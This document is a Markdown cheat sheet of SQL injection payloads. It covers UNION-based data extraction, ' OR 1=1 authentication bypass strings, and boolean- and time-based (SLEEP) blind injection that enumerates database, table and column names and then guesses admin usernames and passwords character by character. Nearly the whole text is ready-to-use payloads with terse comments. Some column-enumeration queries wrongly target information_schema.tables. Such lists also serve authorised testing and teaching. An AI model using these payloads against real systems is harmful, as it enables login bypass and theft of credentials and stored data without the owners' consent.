# SQL Injection

## In-Band SQLi

```sql
-- Check if can retrieve data with union
0 UNION SELECT 1,2,3

-- Get database name
0 UNION SELECT 1,2,database()

-- Get table names
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'TARGET-DATABASE-NAME'

-- Get column names from target table
0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'TARGET-TABLE'

-- Get data from target table (COLUMN1, COLUMN2, COLUMN3 are column names from table)
0 UNION SELECT 1,2,group_concat(COLUMN1,':',COLUMN2,COLUMN3 SEPARATOR '<br>') FROM 'TARGET-TABLE'
```

## Blind SQLi - Authentication bypass

```sql
-- Authentication bypass
' OR 1=1;--
' OR 1=1--
username@or.email'--
```

## Blind SQLi - Boolean based

```sql
-- Check if can use union
0' UNION SELECT 1,2,3;--
```

```sql
-- Discover database name (needs automate with Python)
0' UNION SELECT 1,2,3 WHERE database() LIKE '%';--
0' UNION SELECT 1,2,3 WHERE database() LIKE 'a%';--
0' UNION SELECT 1,2,3 WHERE database() LIKE 'b%';--
0' UNION SELECT 1,2,3 WHERE database() LIKE 'ta%';--
0' UNION SELECT 1,2,3 WHERE database() LIKE 'targetdb';--
```

```sql
-- Discover table name (needs automate with Python)
0' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'targetdb' AND table_name LIKE '%';--
0' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'targetdb' AND table_name LIKE 'a%';--
0' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'targetdb' AND table_name LIKE 'b%';--
0' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'targetdb' AND table_name LIKE 'my%';--
0' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'targetdb' AND table_name LIKE 'mytable';--
```

```sql
-- Discover column name (needs automate with Python)
0' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema='targetdb' AND table_name='mytable' AND column_name LIKE 'a%';--
0' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema='targetdb' AND table_name='mytable' AND column_name LIKE 'b%';--
0' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema='targetdb' AND table_name='mytable' AND column_name LIKE 'id%';--
0' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema='targetdb' AND table_name='mytable' AND column_name LIKE 'id';--

-- Discover next colunm name (needs automate with Python)
0' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema='targetdb' AND table_name='mytable' AND column_name!='id' AND column_name LIKE 'a%';--
0' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema='targetdb' AND table_name='mytable' AND column_name!='id' AND column_name LIKE 'b%';--
0' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema='targetdb' AND table_name='mytable' AND column_name!='id' AND column_name LIKE 'col2';--
```

```sql
-- Discover data stored (needs automate with Python)
0' UNION SELECT 1,2,3 FROM users WHERE username LIKE 'a%
0' UNION SELECT 1,2,3 FROM users WHERE username LIKE 'ab%
0' UNION SELECT 1,2,3 FROM users WHERE username LIKE 'admin

-- Discover more data
0' UNION SELECT 1,2,3 FROM users WHERE username='admin' AND password LIKE 'a%
0' UNION SELECT 1,2,3 FROM users WHERE username='admin' AND password LIKE 'b%
0' UNION SELECT 1,2,3 FROM users WHERE username='admin' AND password LIKE 'some-pass 
```

## Blind SQLi - Time based

```sql
-- Check if can use union
0' UNION SELECT SLEEP(5),2,3;--
```

```sql
-- Discover database name (needs automate with Python)
0' UNION SELECT SLEEP(5),2,3 WHERE database() LIKE '%a';--
0' UNION SELECT SLEEP(5),2,3 WHERE database() LIKE 'targetdb';--
```

```sql
-- Discover table name (needs automate with Python)
0' UNION SELECT SLEEP(5),2,3 FROM information_schema.tables WHERE table_schema = 'mydb' AND table_name LIKE '%a';--
0' UNION SELECT SLEEP(5),2,3 FROM information_schema.tables WHERE table_schema = 'mydb' AND table_name LIKE 'mytb';--
```

```sql
-- Discover column name (needs automate with Python)
0' UNION SELECT SLEEP(5),2,3 FROM information_schema.tables WHERE table_schema='mydb' AND table_name='mytb' AND column_name LIKE 'a%';--
0' UNION SELECT SLEEP(5),2,3 FROM information_schema.tables WHERE table_schema='mydb' AND table_name='mytb' AND column_name LIKE 'id';--

-- Discover next colunm name (needs automate with Python)
0' UNION SELECT SLEEP(5),2,3 FROM information_schema.tables WHERE table_schema='mydb' AND table_name='mytb' AND column_name!='id' AND column_name LIKE 'col%';--
```

```sql
-- Discover data stored (needs automate with Python)
0' UNION SELECT SLEEP(5),2,3 FROM users WHERE username LIKE 'a%
0' UNION SELECT SLEEP(5),2,3 FROM users WHERE username LIKE 'admin

-- Discover more data
0' UNION SELECT SLEEP(5),2,3 FROM users WHERE username='admin' AND password LIKE 'a%
0' UNION SELECT SLEEP(5),2,3 FROM users WHERE username='admin' AND password LIKE 'some-pass 
```